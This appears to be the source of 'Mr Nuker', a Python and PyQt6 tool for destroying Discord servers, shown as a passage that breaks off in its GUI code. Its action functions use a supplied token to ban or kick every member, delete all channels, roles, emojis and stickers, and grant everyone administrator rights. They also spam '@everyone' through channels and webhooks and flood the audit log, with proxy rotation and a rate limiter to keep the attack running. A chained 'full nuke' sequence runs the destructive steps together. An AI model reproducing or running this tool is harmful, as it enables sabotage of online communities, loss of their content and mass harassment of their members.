#!/usr/bin/env python3
# Mr Nuker — Neon Glass UI (Full Command Suite)
# Dependencies: pip install PyQt6 requests

import os
import sys
import time
import math
import random
import string
import re
import threading
import concurrent.futures
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

from PyQt6.QtCore import (
    Qt, QObject, pyqtSignal, QTimer, QPointF, QRectF, QRect,
    QPropertyAnimation, QEasingCurve,
)
from PyQt6.QtGui import (
    QColor, QPainter, QPainterPath, QRadialGradient, QPen, QBrush, QFont,
    QCursor, QLinearGradient, QConicalGradient, QFontMetrics, QIcon, QPixmap,
)
from PyQt6.QtWidgets import (
    QApplication, QWidget, QLabel, QLineEdit, QPushButton, QVBoxLayout,
    QHBoxLayout, QTabWidget, QTextEdit, QMessageBox, QFrame, QComboBox,
    QSpinBox, QCheckBox, QGraphicsOpacityEffect, QGridLayout, QInputDialog,
)

# ─────────────────────────────────────────────────────────────
#  PALETTE
# ─────────────────────────────────────────────────────────────
P = {
    "void":      "#030912",
    "deep":      "#061024",
    "panel":     "#0a1730",
    "blue":      "#2f7dff",
    "blue_soft": "#8fbcff",
    "cyan":      "#4fd8ff",
    "white":     "#ffffff",
    "text":      "#e8f0ff",
    "muted":     "#7688ab",
    "green":     "#4ade80",
    "amber":     "#f7c85a",
    "red":       "#ff5d7a",
}

CREDIT  = "MR NUKER v2.1"
MADE_BY = "Made By @se7iest"

# ─────────────────────────────────────────────────────────────
#  LOG LEVELS
# ─────────────────────────────────────────────────────────────
LEVEL_OK   = "ok"
LEVEL_ERR  = "err"
LEVEL_WARN = "warn"
LEVEL_SYS  = "sys"

_ERROR_TAGS = {"!", "ERR", "FAIL", "TIMEOUT"}
_WARN_TAGS  = {"429", "PROXY", "WARN"}
_SYS_TAGS   = {"*", "INFO", "DEBUG"}

def tag_level(tag):
    if tag in _ERROR_TAGS: return LEVEL_ERR
    if tag in _WARN_TAGS:  return LEVEL_WARN
    if tag in _SYS_TAGS:   return LEVEL_SYS
    return LEVEL_OK

# ─────────────────────────────────────────────────────────────
#  CONFIG / RUNTIME STATE
# ─────────────────────────────────────────────────────────────
PROXIES: list[str] = []
PROXY_ENABLED = False

CHANNEL_COUNT = 10
CHANNEL_NAME  = "mr-nuked"
ROLE_NAME     = "mr-nuked"
SPAM_MESSAGE  = "@everyone mr nuker was here"
SPAM_THREADS  = 3
SPAM_COUNT    = 10

_state = {"TOKEN": "", "GUILD_ID": ""}
_STOP  = threading.Event()

_LOG_HANDLER = None

def log(tag, msg, color=None):
    if _LOG_HANDLER:
        _LOG_HANDLER(tag, msg)
    else:
        print(f"[{tag}] {msg}", flush=True)

# ─────────────────────────────────────────────────────────────
#  PERMISSIONS
# ─────────────────────────────────────────────────────────────
PERM_FLAGS = {
    0x0000000000000001: "CREATE_INSTANT_INVITE",
    0x0000000000000002: "KICK_MEMBERS",
    0x0000000000000004: "BAN_MEMBERS",
    0x0000000000000008: "ADMINISTRATOR",
    0x0000000000000010: "MANAGE_CHANNELS",
    0x0000000000000020: "MANAGE_GUILD",
    0x0000000000000040: "ADD_REACTIONS",
    0x0000000000000080: "VIEW_AUDIT_LOG",
    0x0000000000000100: "PRIORITY_SPEAKER",
    0x0000000000000200: "STREAM",
    0x0000000000000400: "VIEW_CHANNEL",
    0x0000000000000800: "SEND_MESSAGES",
    0x0000000000001000: "SEND_TTS_MESSAGES",
    0x0000000000002000: "MANAGE_MESSAGES",
    0x0000000000004000: "EMBED_LINKS",
    0x0000000000008000: "ATTACH_FILES",
    0x0000000000010000: "READ_MESSAGE_HISTORY",
    0x0000000000020000: "MENTION_EVERYONE",
    0x0000000000040000: "USE_EXTERNAL_EMOJIS",
    0x0000000000080000: "VIEW_GUILD_INSIGHTS",
    0x0000000000100000: "CONNECT",
    0x0000000000200000: "SPEAK",
    0x0000000000400000: "MUTE_MEMBERS",
    0x0000000000800000: "DEAFEN_MEMBERS",
    0x0000000001000000: "MOVE_MEMBERS",
    0x0000000002000000: "USE_VAD",
    0x0000000004000000: "CHANGE_NICKNAME",
    0x0000000008000000: "MANAGE_NICKNAMES",
    0x0000000010000000: "MANAGE_ROLES",
    0x0000000020000000: "MANAGE_WEBHOOKS",
    0x0000000040000000: "MANAGE_GUILD_EXPRESSIONS",
    0x0000000080000000: "USE_APPLICATION_COMMANDS",
    0x0000000100000000: "REQUEST_TO_SPEAK",
    0x0000000400000000: "MANAGE_EVENTS",
    0x0000000800000000: "MANAGE_THREADS",
    0x0000001000000000: "CREATE_PUBLIC_THREADS",
    0x0000002000000000: "CREATE_PRIVATE_THREADS",
    0x0000004000000000: "USE_EXTERNAL_STICKERS",
    0x0000008000000000: "SEND_MESSAGES_IN_THREADS",
    0x0000010000000000: "USE_EMBEDDED_ACTIVITIES",
    0x0000020000000000: "MODERATE_MEMBERS",
}

def decode_perms(pi: int) -> list[str]:
    if pi & 0x8:
        return ["ADMINISTRATOR (all)"]
    return [name for flag, name in PERM_FLAGS.items() if pi & flag]

# ─────────────────────────────────────────────────────────────
#  RATE LIMITER + API
# ─────────────────────────────────────────────────────────────
BASE = "https://discord.com/api/v10"
UA   = "DiscordBot (https://example.com, 1.0)"

API_TIMEOUT = 15
API_RETRIES = 4
DIRECT_FALLBACK = True

_session = requests.Session()

class _Bucket:
    __slots__ = ("limit", "remaining", "reset_at")
    def __init__(self):
        self.limit = None
        self.remaining = None
        self.reset_at = 0.0

class RateLimiter:
    def __init__(self):
        self._lock = threading.Lock()
        self._buckets = {}
        self._route_to_hash = {}
        self._global_reset_at = 0.0

    @staticmethod
    def _route_template(method, endpoint):
        path = endpoint.split("?")[0]
        parts = path.split("/")
        norm = [":id" if (p.isdigit() and len(p) >= 15) else p for p in parts]
        return f"{method} {'/'.join(norm)}"

    def _key_for(self, method, endpoint):
        route = self._route_template(method, endpoint)
        return self._route_to_hash.get(route, route), route

    def acquire(self, method, endpoint):
        key, _ = self._key_for(method, endpoint)
        while True:
            if _STOP.is_set():
                return
            with self._lock:
                g_wait = self._global_reset_at - time.time()
            if g_wait > 0:
                time.sleep(min(g_wait, 30.0))
                continue
            with self._lock:
                b = self._buckets.get(key)
                if b is None:
                    b = _Bucket(); self._buckets[key] = b
                now = time.time()
                if b.remaining is None:
                    return
                if b.reset_at <= now:
                    if b.limit is not None:
                        b.remaining = b.limit
                    b.reset_at = 0.0
                    return
                if b.remaining > 0:
                    b.remaining -= 1
                    return
                wait = b.reset_at - now
            time.sleep(max(0.02, wait))

    def update(self, method, endpoint, resp):
        route = self._route_template(method, endpoint)
        h = resp.headers
        if h.get("X-RateLimit-Global") == "true":
            ra = float(h.get("Retry-After", "1"))
            with self._lock:
                self._global_reset_at = max(self._global_reset_at, time.time() + ra)
        bh = h.get("X-RateLimit-Bucket")
        with self._lock:
            if bh:
                self._route_to_hash[route] = bh
            key = bh or route
            b = self._buckets.get(key)
            if b is None:
                b = _Bucket(); self._buckets[key] = b
            if "X-RateLimit-Limit" in h:
                try: b.limit = int(h["X-RateLimit-Limit"])
                except Exception: pass
            if "X-RateLimit-Remaining" in h:
                try: b.remaining = int(h["X-RateLimit-Remaining"])
                except Exception: pass
            if "X-RateLimit-Reset-After" in h:
                try: b.reset_at = time.time() + float(h["X-RateLimit-Reset-After"])
                except Exception: pass
            elif "X-RateLimit-Reset" in h:
                try: b.reset_at = float(h["X-RateLimit-Reset"])
                except Exception: pass

_limiter = RateLimiter()

def get_headers():
    return {
        "Authorization": _state["TOKEN"],
        "Content-Type":  "application/json",
        "User-Agent":    UA,
    }

def get_proxy():
    if not PROXY_ENABLED or not PROXIES:
        return None
    p = random.choice(PROXIES)
    return {"http": p, "https": p}

def api(method, endpoint, payload=None, retries=API_RETRIES):
    if _STOP.is_set():
        return None
    url = f"{BASE}{endpoint}"
    proxy = get_proxy()
    for attempt in range(retries):
        if _STOP.is_set():
            return None
        _limiter.acquire(method, endpoint)
        try:
            resp = _session.request(
                method, url,
                headers=get_headers(),
                json=payload,
                proxies=proxy or {},
                timeout=API_TIMEOUT,
                verify=True,
            )
        except Exception:
            if proxy and DIRECT_FALLBACK:
                proxy = None
                continue
            time.sleep(0.4 * (attempt + 1))
            continue

        _limiter.update(method, endpoint, resp)

        if resp.status_code == 429:
            try:
                ra = float(resp.json().get("retry_after", 1.0))
            except Exception:
                ra = float(resp.headers.get("Retry-After", "1"))
            log("429", f"{endpoint} — {ra:.2f}s", P["amber"])
            time.sleep(ra + 0.1)
            continue

        if resp.status_code in (502, 503, 504):
            time.sleep(0.8 + attempt)
            continue

        return resp

    log("FAIL", f"{method} {endpoint}", P["red"])
    return None

# ─────────────────────────────────────────────────────────────
#  ACTIONS
# ─────────────────────────────────────────────────────────────
def _sanitize(name):
    slug = re.sub(r"[^a-z0-9\-_]", "-", name.lower())[:100]
    return slug or "mr-nuked"

def _get_all_members():
    members, after = [], 0
    while not _STOP.is_set():
        r = api("GET", f"/guilds/{_state['GUILD_ID']}/members?limit=1000&after={after}")
        if not r or r.status_code != 200:
            break
        batch = r.json()
        if not batch:
            break
        members.extend(batch)
        after = int(batch[-1]["user"]["id"])
        if len(batch) < 1000:
            break
    return members

def _drain(futs, timeout=900):
    try:
        for _ in as_completed(futs, timeout=timeout):
            if _STOP.is_set():
                break
    except concurrent.futures.TimeoutError:
        log("TIMEOUT", f"{len(futs)} futures — {timeout}s", P["amber"])

def ban_all_members():
    members = _get_all_members()
    log("*", f"Banning {len(members)}...", P["cyan"])
    def ban(m):
        uid = m["user"]["id"]
        r = api("PUT", f"/guilds/{_state['GUILD_ID']}/bans/{uid}", {"delete_message_days": 7})
        if r and r.status_code in (200, 204):
            log("BAN", m["user"].get("username", uid))
    with ThreadPoolExecutor(max_workers=32) as ex:
        _drain([ex.submit(ban, m) for m in members])

def ban_ids():
    ids_str, ok = QInputDialog.getText(None, "Ban IDs", "Enter space-separated user IDs:")
    if not ok or not ids_str: return
    ids = ids_str.replace(",", " ").split()
    log("*", f"Banning {len(ids)} IDs...", P["cyan"])
    def ban(uid):
        r = api("PUT", f"/guilds/{_state['GUILD_ID']}/bans/{uid}", {"delete_message_days": 7})
        if r and r.status_code in (200, 204):
            log("BAN ID", uid)
    with ThreadPoolExecutor(max_workers=8) as ex:
        _drain([ex.submit(ban, uid) for uid in ids])

def kick_all_members():
    members = _get_all_members()
    log("*", f"Kicking {len(members)}...", P["cyan"])
    def kick(m):
        uid = m["user"]["id"]
        r = api("DELETE", f"/guilds/{_state['GUILD_ID']}/members/{uid}")
        if r and r.status_code in (200, 204):
            log("KICK", m["user"].get("username", uid))
    with ThreadPoolExecutor(max_workers=32) as ex:
        _drain([ex.submit(kick, m) for m in members])

def prune_members():
    r = api("POST", f"/guilds/{_state['GUILD_ID']}/prune",
            {"days": 7, "compute_prune_count": True})
    if r:
        log("PRUNE", f"{r.json().get('pruned', 0)} pruned")

def nick_all():
    members = _get_all_members()
    log("*", f"Renaming {len(members)} members...", P["cyan"])
    name = "mr-nuked"
    def nick(m):
        uid = m["user"]["id"]
        r = api("PATCH", f"/guilds/{_state['GUILD_ID']}/members/{uid}", {"nick": name})
        if r and r.status_code == 200:
            log("NICK", f"{m['user'].get('username')} -> {name}")
    with ThreadPoolExecutor(max_workers=32) as ex:
        _drain([ex.submit(nick, m) for m in members])

def delete_all_channels():
    r = api("GET", f"/guilds/{_state['GUILD_ID']}/channels")
    if not r or r.status_code != 200:
        log("!", "Channel fetch failed", P["red"]); return
    channels = r.json()
    log("*", f"Deleting {len(channels)} channels...", P["cyan"])
    def delete(ch):
        res = api("DELETE", f"/channels/{ch['id']}")
        if res and res.status_code == 200:
            log("DEL CH", ch.get("name", ch["id"]))
    with ThreadPoolExecutor(max_workers=64) as ex:
        _drain([ex.submit(delete, c) for c in channels])

def create_channels():
    log("*", f"Creating {CHANNEL_COUNT} channels...", P["cyan"])
    def create(_):
        r = api("POST", f"/guilds/{_state['GUILD_ID']}/channels",
                {"name": CHANNEL_NAME, "type": 0})
        if r and r.status_code == 201:
            cid = r.json()["id"]
            log("CREATE CH", cid)
            return cid
        return None
    ids = []
    with ThreadPoolExecutor(max_workers=16) as ex:
        futs = [ex.submit(create, i) for i in range(CHANNEL_COUNT)]
        for f in as_completed(futs):
            if _STOP.is_set(): break
            v = f.result()
            if v: ids.append(v)
    return ids

def spam_channels(channel_ids=None):
    if channel_ids is None:
        r = api("GET", f"/guilds/{_state['GUILD_ID']}/channels")
        if not r or r.status_code != 200:
            return
        channel_ids = [c["id"] for c in r.json() if c["type"] == 0]
    if not channel_ids:
        return
    log("*", f"Spamming {len(channel_ids)} channels × {SPAM_THREADS}...", P["cyan"])
    def send(cid):
        for _ in range(SPAM_COUNT):
            if _STOP.is_set(): return
            api("POST", f"/channels/{cid}/messages", {"content": SPAM_MESSAGE})
    workers = min(200, SPAM_THREADS * len(channel_ids))
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = [ex.submit(send, cid) for cid in channel_ids for _ in range(SPAM_THREADS)]
        _drain(futs)

def webhook_spam():
    r = api("GET", f"/guilds/{_state['GUILD_ID']}/channels")
    if not r or r.status_code != 200: return
    channels = [c for c in r.json() if c["type"] == 0]
    log("*", f"Webhook spamming {len(channels)} channels...", P["cyan"])

    def spam_channel(cid):
        wh_r = api("POST", f"/channels/{cid}/webhooks", {"name": "Mr Nuker"})
        if not wh_r or wh_r.status_code != 200: return
        wh_url = wh_r.json()["url"]
        for _ in range(SPAM_COUNT):
            if _STOP.is_set(): break
            try:
                requests.post(wh_url, json={"content": SPAM_MESSAGE, "username": "Mr Nuker"})
            except Exception: pass

    with ThreadPoolExecutor(max_workers=16) as ex:
        _drain([ex.submit(spam_channel, c['id']) for c in channels])

def say_message():
    cid, ok = QInputDialog.getText(None, "Say", "Enter channel ID:")
    if not ok or not cid: return
    msg, ok = QInputDialog.getText(None, "Say", "Enter message:")
    if not ok or not msg: return

    log("SAY", f"Sending to {cid}...", P["cyan"])
    r = api("POST", f"/channels/{cid}/messages", {"content": msg})
    if r and r.status_code == 200:
        log("SENT", msg)
    else:
        log("!", "Failed to send", P["red"])

def create_roles():
    log("*", f"Creating {CHANNEL_COUNT} roles...", P["cyan"])
    def create(_):
        r = api("POST", f"/guilds/{_state['GUILD_ID']}/roles",
                {"name": ROLE_NAME, "color": 0xFF0000, "permissions": "0"})
        if r and r.status_code == 200:
            log("CREATE ROLE", r.json()["id"])
    with ThreadPoolExecutor(max_workers=16) as ex:
        _drain([ex.submit(create, i) for i in range(CHANNEL_COUNT)])

def delete_all_roles():
    r = api("GET", f"/guilds/{_state['GUILD_ID']}/roles")
    if not r or r.status_code != 200: return
    roles = [ro for ro in r.json() if ro["name"] != "@everyone"]
    log("*", f"Deleting {len(roles)} roles...", P["cyan"])
    def delete(ro):
        res = api("DELETE", f"/guilds/{_state['GUILD_ID']}/roles/{ro['id']}")
        if res and res.status_code == 204:
            log("DEL ROLE", ro.get("name", ro["id"]))
    with ThreadPoolExecutor(max_workers=64) as ex:
        _drain([ex.submit(delete, ro) for ro in roles])

def give_everyone_admin():
    log("*", "Giving everyone admin perms...", P["cyan"])
    r = api("GET", f"/guilds/{_state['GUILD_ID']}/roles")
    if not r or r.status_code != 200: return
    roles = r.json()
    def update(ro):
        api("PATCH", f"/guilds/{_state['GUILD_ID']}/roles/{ro['id']}", {"permissions": "8"})
        log("ADMIN", ro.get("name", ro["id"]))
    with ThreadPoolExecutor(max_workers=8) as ex:
        _drain([ex.submit(update, ro) for ro in roles])

def delete_all_emojis():
    r = api("GET", f"/guilds/{_state['GUILD_ID']}/emojis")
    if not r or r.status_code != 200: return
    emojis = r.json()
    log("*", f"Deleting {len(emojis)} emojis...", P["cyan"])
    def delete(e):
        res = api("DELETE", f"/guilds/{_state['GUILD_ID']}/emojis/{e['id']}")
        if res and res.status_code == 204:
            log("DEL EMOJI", e.get("name", e["id"]))
    with ThreadPoolExecutor(max_workers=32) as ex:
        _drain([ex.submit(delete, e) for e in emojis])

def delete_all_stickers():
    r = api("GET", f"/guilds/{_state['GUILD_ID']}/stickers")
    if not r or r.status_code != 200: return
    stickers = r.json()
    log("*", f"Deleting {len(stickers)} stickers...", P["cyan"])
    def delete(s):
        res = api("DELETE", f"/guilds/{_state['GUILD_ID']}/stickers/{s['id']}")
        if res and res.status_code == 204:
            log("DEL STICKER", s.get("name", s["id"]))
    with ThreadPoolExecutor(max_workers=32) as ex:
        _drain([ex.submit(delete, s) for s in stickers])

def rename_guild():
    name = "mr-nuked-" + "".join(random.choices(string.ascii_lowercase, k=5))
    r = api("PATCH", f"/guilds/{_state['GUILD_ID']}", {"name": name})
    if r and r.status_code == 200:
        log("RENAME", r.json().get("name", name))

def rename_channels():
    r = api("GET", f"/guilds/{_state['GUILD_ID']}/channels")
    if not r or r.status_code != 200: return
    channels = r.json()
    def rename(ch):
        name = "mr-nuked-" + "".join(random.choices(string.digits, k=4))
        res = api("PATCH", f"/channels/{ch['id']}", {"name": name})
        if res and res.status_code == 200:
            log("RENAME CH", f"{ch.get('name')} → {name}")
    with ThreadPoolExecutor(max_workers=64) as ex:
        _drain([ex.submit(rename, c) for c in channels])

def rename_roles():
    r = api("GET", f"/guilds/{_state['GUILD_ID']}/roles")
    if not r or r.status_code != 200: return
    roles = [ro for ro in r.json() if ro["name"] != "@everyone"]
    def rename(ro):
        name = "mr-nuked-" + "".join(random.choices(string.digits, k=4))
        res = api("PATCH", f"/guilds/{_state['GUILD_ID']}/roles/{ro['id']}", {"name": name})
        if res and res.status_code == 200:
            log("RENAME ROLE", f"{ro.get('name')} → {name}")
    with ThreadPoolExecutor(max_workers=32) as ex:
        _drain([ex.submit(rename, r) for r in roles])

def audit_lag():
    log("*", "Flooding audit log (role updates)...", P["cyan"])
    r = api("GET", f"/guilds/{_state['GUILD_ID']}/roles")
    if not r or r.status_code != 200: return
    roles = [ro for ro in r.json() if ro["name"] != "@everyone"]
    if not roles: return

    def spam_role(ro):
        while not _STOP.is_set():
            name = "lag-" + "".join(random.choices(string.digits, k=4))
            api("PATCH", f"/guilds/{_state['GUILD_ID']}/roles/{ro['id']}", {"name": name})
    
    with ThreadPoolExecutor(max_workers=4) as ex:
        futs = [ex.submit(spam_role, ro) for ro in roles[:4]]
        _drain(futs)

def restart_app():
    log("SYS", "Restarting...", P["cyan"])
    time.sleep(0.5)
    os.execl(sys.executable, sys.executable, *sys.argv)

def logout_app():
    log("SYS", "Logging out...", P["cyan"])
    sys.exit(0)

def full_nuke():
    log("*", "FULL NUKE SEQUENCE", P["red"])
    try:
        r = requests.get(f"{BASE}/guilds/{_state['GUILD_ID']}/channels",
                         headers={"Authorization": _state["TOKEN"], "User-Agent": UA},
                         timeout=10)
        if r.status_code != 200:
            log("!", f"Pre-flight HTTP {r.status_code} — abort", P["red"])
            return
    except Exception as e:
        log("!", f"Pre-flight error: {type(e).__name__}", P["red"])
        return

    rename_guild()
    delete_all_channels()
    delete_all_roles()
    delete_all_emojis()
    delete_all_stickers()
    ch_ids = create_channels()
    create_roles()
    if ch_ids:
        spam_channels(ch_ids)
    ban_all_members()
    log("OK", "Full nuke complete.")

ACTIONS = [
    ("BAN MEMBERS",     ban_all_members,     True),
    ("KICK MEMBERS",    kick_all_members,    True),
    ("PRUNE MEMBERS",   prune_members,       False),
    ("BAN IDS",         ban_ids,             True),

    ("DEL CHANNELS",    delete_all_channels, True),
    ("CREATE CHANNELS", create_channels,     False),
    ("RENAME CHANNELS", rename_channels,     False),
    ("SPAM CHANNELS",   spam_channels,       False),

    ("DEL ROLES",       delete_all_roles,    True),
    ("CREATE ROLES",    create_roles,        False),
    ("RENAME ROLES",    rename_roles,        False),
    ("ADMIN EVERYONE",  give_everyone_admin, True),

    ("DEL EMOJIS",      delete_all_emojis,   True),
    ("DEL STICKERS",    delete_all_stickers, True),
    ("RENAME GUILD",    rename_guild,        False),
    ("NICK ALL",        nick_all,            False),

    ("WEBHOOK SPAM",    webhook_spam,        False),
    ("AUDIT LAG",       audit_lag,           False),
    ("SAY",             say_message,         False),
    ("RESTART",         restart_app,         False),

    ("LOGOUT",          logout_app,          True),
]

# ─────────────────────────────────────────────────────────────
#  SIGNALS
# ─────────────────────────────────────────────────────────────
class Signals(QObject):
    log           = pyqtSignal(str, str)
    state         = pyqtSignal(str)
    stats         = pyqtSignal(int, int, int)
    done          = pyqtSignal(str, bool)
    auth_ok       = pyqtSignal(str)
    auth_fail     = pyqtSignal()
    guilds_loaded = pyqtSignal(list)

# ─────────────────────────────────────────────────────────────
#  STYLESHEET
# ─────────────────────────────────────────────────────────────
STYLE = f"""
QWidget {{
    background: transparent;
    color: {P['text']};
    font-family: 'Segoe UI', 'Consolas', sans-serif;
    font-size: 12px;
}}
QLabel#cap {{
    color: {P['blue_soft']};
    letter-spacing: 3px;
    font-size: 9px;
    font-weight: 700;
}}
QLineEdit, QSpinBox, QComboBox {{
    background: rgba(255,255,255,14);
    border: 1px solid rgba(47,125,255,80);
    border-radius: 9px;
    padding: 8px 11px;
    color: #f4f9ff;
    selection-background-color: {P['blue']};
    selection-color: #ffffff;
    min-height: 16px;
}}
QLineEdit:hover, QSpinBox:hover, QComboBox:hover {{
    border: 1px solid rgba(143,188,255,150);
}}
QLineEdit:focus, QSpinBox:focus, QComboBox:focus {{
    border: 1px solid {P['cyan']};
    background: rgba(47,125,255,28);
}}
QLineEdit:disabled, QSpinBox:disabled, QComboBox:disabled {{
    color: rgba(160,180,210,110);
    background: rgba(255,255,255,6);
    border: 1px solid rgba(47,125,255,35);
}}
QSpinBox::up-button, QSpinBox::down-button {{
    width: 0; height: 0; border: none;
}}
QComboBox::drop-down {{ border: none; width: 22px; }}
QComboBox::down-arrow {{
    image: none;
    border-left: 4px solid transparent;
    border-right: 4px solid transparent;
    border-top: 5px solid {P['blue_soft']};
    width: 0; height: 0;
    margin-right: 8px;
}}
QComboBox QAbstractItemView {{
    background: {P['deep']};
    color: {P['text']};
    border: 1px solid rgba(47,125,255,110);
    border-radius: 8px;
    selection-background-color: rgba(47,125,255,150);
    selection-color: #ffffff;
    outline: none;
}}
QTextEdit {{
    background: rgba(3,7,16,200);
    border: 1px solid rgba(47,125,255,55);
    border-radius: 14px;
    color: #cfe6ff;
    padding: 12px;
    font-family: 'Cascadia Code', 'Consolas', monospace;
    font-size: 11px;
}}
QScrollBar:vertical {{
    background: transparent; width: 8px; margin: 4px;
}}
QScrollBar::handle:vertical {{
    background: qlineargradient(x1:0,y1:0,x2:1,y2:0,
        stop:0 {P['blue']}, stop:1 {P['cyan']});
    border-radius: 4px;
    min-height: 28px;
}}
QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {{ height: 0; }}
QScrollBar::add-page:vertical, QScrollBar::sub-page:vertical {{ background: transparent; }}

QTabWidget::pane {{
    border: 1px solid rgba(47,125,255,65);
    border-radius: 14px;
    top: -1px;
    background: rgba(47,125,255,12);
}}
QTabBar::tab {{
    background: rgba(255,255,255,8);
    color: {P['muted']};
    padding: 9px 22px;
    border-top-left-radius: 10px;
    border-top-right-radius: 10px;
    margin-right: 4px;
    letter-spacing: 3px;
    font-weight: 700;
    font-size: 10px;
}}
QTabBar::tab:selected {{
    background: qlineargradient(x1:0,y1:0,x2:1,y2:0,
        stop:0 rgba(47,125,255,170), stop:0.5 rgba(79,216,255,130),
        stop:1 rgba(47,125,255,170));
    color: #ffffff;
    border: 1px solid rgba(79,216,255,150);
    border-bottom: none;
}}
QTabBar::tab:hover:!selected {{ color: {P['cyan']}; }}

QPushButton#act {{
    background: rgba(255,255,255,12);
    border: 1px solid rgba(47,125,255,70);
    border-radius: 11px;
    padding: 10px 6px;
    color: {P['blue_soft']};
    font-weight: 800;
    font-size: 9px;
    letter-spacing: 1px;
}}
QPushButton#act:hover {{
    background: rgba(47,125,255,80);
    border: 1px solid {P['cyan']};
    color: #ffffff;
}}
QPushButton#act:pressed {{ background: rgba(79,216,255,140); color: {P['deep']}; }}
QPushButton#act:disabled {{
    color: rgba(150,165,195,90);
    border: 1px solid rgba(60,80,110,60);
    background: rgba(255,255,255,4);
}}
QPushButton#actDanger {{
    background: rgba(255,93,122,16);
    border: 1px solid rgba(255,93,122,90);
    border-radius: 11px;
    padding: 10px 6px;
    color: #ffb0bf;
    font-weight: 800;
    font-size: 9px;
    letter-spacing: 1px;
}}
QPushButton#actDanger:hover {{
    background: rgba(255,93,122,110);
    border: 1px solid {P['red']};
    color: #ffffff;
}}
QPushButton#actDanger:disabled {{
    color: rgba(150,160,180,90);
    border: 1px solid rgba(120,130,150,45);
    background: rgba(255,255,255,4);
}}

QPushButton#primary {{
    background: qlineargradient(x1:0,y1:0,x2:0,y2:1,
        stop:0 {P['blue']}, stop:1 #1e5fcc);
    color: #ffffff;
    border: 1px solid rgba(143,188,255,180);
    border-radius: 9px;
    padding: 8px 14px;
    font-weight: 700;
    letter-spacing: 1px;
}}
QPushButton#primary:hover {{
    background: qlineargradient(x1:0,y1:0,x2:0,y2:1,
        stop:0 #4f97ff, stop:1 #2f7dff);
    border: 1px solid #ffffff;
}}
QPushButton#primary:pressed {{ background: #ffffff; color: {P['deep']}; }}
QPushButton#primary:disabled {{
    background: rgba(60,80,110,120);
    border-color: rgba(130,150,180,55);
    color: rgba(215,228,245,110);
}}

QPushButton#ghost {{
    background: rgba(255,255,255,10);
    border: 1px solid rgba(47,125,255,70);
    border-radius: 9px;
    padding: 7px 12px;
    color: {P['blue_soft']};
    font-weight: 600;
}}
QPushButton#ghost:hover {{
    background: rgba(47,125,255,90);
    border: 1px solid {P['cyan']};
    color: #ffffff;
}}
QPushButton#ghost:disabled {{
    color: rgba(150,165,195,80);
    border: 1px solid rgba(60,80,110,50);
}}

QPushButton#detonate {{
    background: qlineargradient(x1:0,y1:0,x2:0,y2:1,
        stop:0 {P['red']}, stop:0.55 #ff8aa0, stop:1 {P['red']});
    color: #ffffff;
    border: 1px solid rgba(255,255,255,200);
    border-radius: 20px;
    padding: 12px 34px;
    letter-spacing: 7px;
    font-weight: 900;
    font-size: 12px;
}}
QPushButton#detonate:hover {{
    border: 1px solid #ffffff;
    background: qlineargradient(x1:0,y1:0,x2:0,y2:1,
        stop:0 #ff7d95, stop:0.55 #ffb3c2, stop:1 #ff7d95);
}}
QPushButton#detonate:pressed {{ background: #ffffff; color: {P['deep']}; }}
QPushButton#detonate:disabled {{
    background: rgba(80,60,70,110);
    border-color: rgba(150,130,140,55);
    color: rgba(220,205,215,110);
}}

QPushButton#wbtn {{
    background: rgba(255,255,255,16);
    color: {P['blue_soft']};
    border: none;
    border-radius: 8px;
    font-size: 13px;
}}
QPushButton#wbtn:hover {{ background: rgba(47,125,255,190); color: #ffffff; }}
QPushButton#closebtn:hover {{ background: {P['red']}; color: #ffffff; }}

QCheckBox {{
    color: {P['blue_soft']};
    font-size: 11px;
    font-weight: 600;
    letter-spacing: 1px;
    spacing: 8px;
}}
QCheckBox::indicator {{
    width: 15px; height: 15px;
    border: 1px solid rgba(47,125,255,110);
    border-radius: 4px;
    background: rgba(255,255,255,10);
}}
QCheckBox::indicator:checked {{
    background: qlineargradient(x1:0,y1:0,x2:1,y2:1,
        stop:0 {P['blue']}, stop:1 {P['cyan']});
    border: 1px solid {P['cyan']};
}}
"""

# ─────────────────────────────────────────────────────────────
#  GLASS FRAME
# ─────────────────────────────────────────────────────────────
class GlassFrame(QFrame):
    def __init__(self, parent=None, radius=22):
        super().__init__(parent)
        self.radius = radius
        self.t = 0.0
        self.timer = QTimer(self)
        self.timer.timeout.connect(self._tick)
        self.timer.start(45)

    def _tick(self):
        self.t = (self.t + 0.008) % 1.0
        self.update()

    def paintEvent(self, event):
        p = QPainter(self)
        p.setRenderHint(QPainter.RenderHint.Antialiasing)
        r = QRectF(self.rect()).adjusted(1.5, 1.5, -1.5, -1.5)
        path = QPainterPath()
        path.addRoundedRect(r, self.radius, self.radius)

        fill = QLinearGradient(r.topLeft(), r.bottomRight())
        fill.setColorAt(0.0, QColor(P["panel"]))
        fill.setColorAt(0.5, QColor(P["deep"]))
        fill.setColorAt(1.0, QColor(P["void"]))
        p.fillPath(path, QBrush(fill))

        ang = QConicalGradient(r.center(), self.t * 360)
        ang.setColorAt(0.00, QColor(P["blue"]))
        ang.setColorAt(0.25, QColor(P["cyan"]))
        ang.setColorAt(0.50, QColor(P["white"]))
        ang.setColorAt(0.75, QColor(P["blue_soft"]))
        ang.setColorAt(1.00, QColor(P["blue"]))
        p.setPen(QPen(QColor(47, 125, 255, 55), 7.0))
        p.setBrush(Qt.BrushStyle.NoBrush)
        p.drawPath(path)
        p.setPen(QPen(QBrush(ang), 1.4))
        p.drawPath(path)

        p.setClipPath(path)
        head = self.t
        sweep = QLinearGradient(r.left(), 0, r.right(), 0)
        sweep.setColorAt(max(0.0, head - 0.15), QColor(255, 255, 255, 0))
        sweep.setColorAt(head, QColor(255, 255, 255, 85))
        sweep.setColorAt(min(1.0, head + 0.15), QColor(255, 255, 255, 0))
        p.setPen(Qt.PenStyle.NoPen)
        p.setBrush(QBrush(sweep))
        p.drawRect(QRectF(r.left(), r.top(), r.width(), 1.6))
        p.end()

# ─────────────────────────────────────────────────────────────
#  AURORA BACKDROP
# ─────────────────────────────────────────────────────────────
class AuroraBackdrop(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setAttribute(Qt.WidgetAttribute.WA_TransparentForMouseEvents)
        self.t = 0.0
        self.motes = []
        self.timer = QTimer(self)
        self.timer.timeout.connect(self._tick)
        self.timer.start(50)

    def _tick(self):
        self.t += 0.02
        w, h = self.width(), self.height()
        if w <= 0 or h <= 0:
            return
        if len(self.motes) < 46:
            self.motes.append({
                "x": random.uniform(0, w), "y": random.uniform(0, h),
                "vx": random.uniform(-0.3, 0.3), "vy": random.uniform(-0.7, -0.15),
